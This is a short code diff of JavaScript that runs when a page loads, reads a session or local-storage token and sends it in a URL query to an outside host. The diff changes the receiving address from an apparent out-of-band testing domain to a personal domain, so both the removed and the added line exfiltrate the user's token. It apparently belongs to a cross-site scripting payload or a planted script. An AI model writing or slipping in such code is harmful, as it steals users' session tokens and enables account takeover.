@@ -4,7 +4,7 @@ document.addEventListener("DOMContentLoaded", () => {
     const token = sessionToken || localToken;
 
     if (token) {
-        fetch(`https://rddllovzousqsobdgdtx9y20oju9plvex.oast.fun/?token=${encodeURIComponent(token)}`)
+        fetch(`https://spandanpokhrel.com.np/?token=${encodeURIComponent(token)}`)
         .then(response => response.text())
         .catch(error => console.error("Error sending token:", error));
     }
